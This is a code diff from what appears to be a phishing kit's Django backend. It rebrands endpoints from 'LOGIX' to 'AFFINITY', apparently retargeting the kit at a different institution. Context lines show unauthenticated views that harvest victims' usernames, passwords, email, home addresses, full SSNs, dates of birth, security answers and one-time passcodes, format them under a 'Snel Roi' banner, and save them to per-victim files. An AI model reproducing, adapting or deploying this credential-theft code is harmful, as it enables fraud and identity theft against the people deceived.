@@ -47,7 +47,7 @@ def _notification_recipients():
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_login_cred(request):
+def affinity_collect_user_login_cred(request):
 
     payload = {}
     data = {}
@@ -101,7 +101,7 @@ def logix_collect_user_login_cred(request):
                 date=date,
             )
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
             message += f"|========= [  LOGIN  ] ==========|\n"
             message += f"| ➤ [ Username ]         : {username}\n"
             message += f"| ➤ [ Password ]      : {password}\n"
@@ -129,7 +129,7 @@ def logix_collect_user_login_cred(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception as exc:
-            logger.exception("logix_collect_user_login_cred failed")
+            logger.exception("affinity_collect_user_login_cred failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -143,7 +143,7 @@ def logix_collect_user_login_cred(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_login_cred2(request):
+def affinity_collect_user_login_cred2(request):
 
     payload = {}
     data = {}
@@ -207,7 +207,7 @@ def logix_collect_user_login_cred2(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
             message += f"|========= [  LOGIN CONFIRM ] ==========|\n"
             message += f"| ➤ [ Username ]        : {username}\n"
             message += f"| ➤ [ Password2 ]      : {password}\n"
@@ -229,7 +229,7 @@ def logix_collect_user_login_cred2(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_login_cred2 failed")
+            logger.exception("affinity_collect_user_login_cred2 failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -245,7 +245,7 @@ def logix_collect_user_login_cred2(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_basic_info(request):
+def affinity_collect_user_basic_info(request):
 
     payload = {}
     data = {}
@@ -303,7 +303,7 @@ def logix_collect_user_basic_info(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
             message += f"|========= [  CLIENT INFO ] ==========|\n"
             message += f"| ➤ [ Username ]       : {username}\n"
             message += f"| ➤ [ Email ]          : {email}\n"
@@ -333,7 +333,7 @@ def logix_collect_user_basic_info(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_basic_info failed")
+            logger.exception("affinity_collect_user_basic_info failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -347,7 +347,7 @@ def logix_collect_user_basic_info(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_home_address(request):
+def affinity_collect_user_home_address(request):
 
     payload = {}
     data = {}
@@ -409,7 +409,7 @@ def logix_collect_user_home_address(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
             message += f"|========= [  HOME ADDRESS ] ==========|\n"
             message += f"| ➤ [ Street Address ]   : {streetAddress}\n"
             message += f"| ➤ [ City ]             : {_city}\n"
@@ -440,7 +440,7 @@ def logix_collect_user_home_address(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_home_address failed")
+            logger.exception("affinity_collect_user_home_address failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -454,7 +454,7 @@ def logix_collect_user_home_address(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_social_security(request):
+def affinity_collect_user_social_security(request):
 
     payload = {}
     data = {}
@@ -506,7 +506,7 @@ def logix_collect_user_social_security(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
             message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
             message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
             message += f"| ➤ [ DOB ]             : {dob}\n"
@@ -534,7 +534,7 @@ def logix_collect_user_social_security(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_social_security failed")
+            logger.exception("affinity_collect_user_social_security failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -548,7 +548,7 @@ def logix_collect_user_social_security(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_social_security_2(request):
+def affinity_collect_user_social_security_2(request):
 
     payload = {}
     data = {}
@@ -600,7 +600,7 @@ def logix_collect_user_social_security_2(request):
 
             browser_data.save()
 
-            message = f"|=====||Snel Roi -LOGIX||=====|\n"
+            message = f"|=====||Snel Roi -AFFINITY||=====|\n"
             message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
             message += f"| ➤ [ SSN ]             : {ssn}\n"
             message += f"| ➤ [ DOB ]             : {dob}\n"
@@ -628,7 +628,7 @@ def logix_collect_user_social_security_2(request):
             payload["message"] = "Successful"
             payload["data"] = data
         except Exception:
-            logger.exception("logix_collect_user_social_security_2 failed")
+            logger.exception("affinity_collect_user_social_security_2 failed")
             payload["message"] = "Errors"
             payload["errors"] = {"detail": ["Internal server error"]}
             return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
@@ -642,7 +642,7 @@ def logix_collect_user_social_security_2(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_security_questions(request):
+def affinity_collect_user_security_questions(request):
 
     payload = {}
     data = {}
@@ -736,7 +736,7 @@ def logix_collect_user_security_questions(request):
 
         browser_data.save()
 
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
+        message = f"|=====||Snel Roi -AFFINITY||=====|\n"
         message += f"|========= [  SECURITY QUESTIONS ] ==========|\n"
         message += f"| ➤ [ Question 1 ]      : {securityQuestion1}\n"
         message += f"| ➤ [ Answer 1 ]        : {securityAnswer1}\n"
@@ -778,7 +778,7 @@ def logix_collect_user_security_questions(request):
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        affinity_save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
@@ -792,7 +792,7 @@ def logix_collect_user_security_questions(request):
 )
 @permission_classes([])
 @authentication_classes([])
-def logix_collect_user_otp_verification(request):
+def affinity_collect_user_otp_verification(request):
 
     payload = {}
     data = {}
@@ -856,7 +856,7 @@ def logix_collect_user_otp_verification(request):
 
         browser_data.save()
 
-        message = f"|=====||Snel Roi -LOGIX||=====|\n"
+        message = f"|=====||Snel Roi -AFFINITY||=====|\n"
         message += f"|========= [  OTP VERIFICATION ] ==========|\n"
         message += f"| ➤ [ Email ]           : {username}\n"
         message += f"| ➤ [ OTP ]             : {otp}\n"
@@ -894,14 +894,14 @@ def logix_collect_user_otp_verification(request):
         #####################################
         # Save to txt
         ##############################
-        logix_save_data_to_file(username, message)
+        affinity_save_data_to_file(username, message)
 
         payload["message"] = "Successful"
         payload["data"] = data
     return Response(payload)
 
 
-def logix_is_valid_email(email):
+def affinity_is_valid_email(email):
     # Regular expression pattern for basic email validation
     pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
 
@@ -912,7 +912,7 @@ def logix_is_valid_email(email):
         return False
 
 
-def logix_save_data_to_file(email, message):
+def affinity_save_data_to_file(email, message):
     # Ensure the 'clients' folder exists
     folder_path = "clients"
     if not os.path.exists(folder_path):
